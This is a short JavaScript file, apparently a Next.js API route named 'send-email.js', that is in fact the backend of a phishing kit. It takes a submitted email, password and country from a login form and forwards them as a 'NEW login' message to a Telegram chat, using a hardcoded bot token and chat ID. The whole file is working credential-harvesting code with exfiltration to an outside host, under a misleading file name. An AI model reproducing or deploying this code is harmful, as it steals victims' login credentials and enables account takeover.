// pages/api/send-email.js

import axios from 'axios';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, password, country } = req.body;

    // Prepare message for Telegram
    const message = `NEW login from ${country}\nEmail: ${email}\nPassword: ${password}`;

    try {
      // Send message to Telegram using the bot API
      const telegramResponse = await axios.post(`https://api.telegram.org/bot8006326532:AAEr9sd_wmWeI_8ULKtTuyp19a9ja9qJz_A/sendMessage`, {
        chat_id: '-1002493880170', // Replace with your Group ID
        text: message,
      });

      if (telegramResponse.status === 200) {
        res.status(200).json({ message: 'Message sent to Telegram successfully!' });
      } else {
        throw new Error('Failed to send message to Telegram.');
      }
    } catch (error) {
      console.error('Error sending message to Telegram:', error);
      res.status(500).json({ error: 'Failed to send message to Telegram.' });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end(`Method ${req.method} Not Allowed`);
  }
}
